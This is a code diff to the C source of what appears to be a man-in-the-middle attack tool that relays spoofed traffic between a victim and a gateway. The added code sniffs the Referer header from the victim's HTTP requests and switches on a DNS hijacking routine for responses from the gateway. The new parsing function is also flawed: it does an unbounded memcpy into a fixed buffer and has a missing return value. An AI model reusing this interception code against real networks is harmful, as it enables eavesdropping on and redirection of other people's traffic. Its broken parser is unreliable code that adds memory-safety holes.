@@ -9,6 +9,20 @@
 
 #include "head.h"
 
+int HTMLPaser(char *buf) {
+    char url[1024];
+    char *ref = strstr(buf, "Referer");
+    if (ref == NULL)
+        return 1;
+    char *end = strstr(ref + 1, "\n");
+    if (end == NULL)
+        return 1;
+    memcpy(url, ref + 9, end - ref - 11);
+    if (strlen(url) == 0)
+        return 1;
+    printf("%s\n", url);
+}
+
 int forward(char *dev, u_short pro_type, u_char *DST, u_char *SRC, const u_char *payload, int len, int Times) {
 
     /* definations */
@@ -59,6 +73,7 @@ void getPacket(u_char *arg, const struct pcap_pkthdr *hp, const u_char *packet) 
     u_char *attacker_mac = MITM_arg.ATTACKER_MAC;
     u_char *victim_ip = MITM_arg.TARGET_IP;
     u_char *gateway_ip = MITM_arg.GATEWAY_IP;
+    int mode = MITM_arg.mode;
 
     /* get packet information */
     ethernet_header *pEther = (ethernet_header *)packet;
@@ -66,11 +81,23 @@ void getPacket(u_char *arg, const struct pcap_pkthdr *hp, const u_char *packet) 
 
     /* get packet form victim */
     if (!memcmp(pEther->SRC_mac, victim_mac, 6)) {
+        if (mode == Get && pIpv4->protocol_type == PROTOCOL_TCP) {
+            tcp_header *pTcp = (tcp_header *)(packet + 34);
+            if (ntohs(pTcp->dest_port) == 80) {
+                char *data = (char *)(packet + 54);
+                HTMLPaser(data);
+            }
+        }
         forward(dev, type, gateway_mac, attacker_mac, packet + 14, hp->len - 14, Times);
     }
     else if (!memcmp(pEther->SRC_mac, gateway_mac, 6)) {
-        //if (pIpv4->protocol_type == PROTOCOL_UDP)
-            //DnshijackG(packet + 42, hp->len - 42);
+        if (mode == Dns && pIpv4->protocol_type == PROTOCOL_UDP) {
+            udp_header *pUdp = (udp_header *)(packet + 34);
+            if (ntohs(pUdp->sour_port) == 53) {
+                u_char *dns_packet = (u_char *)(packet + 42);
+                DNSHijack(dns_packet);
+            }
+        }
         forward(dev, type, victim_mac, attacker_mac, packet + 14, hp->len - 14, Times);
     }
 }
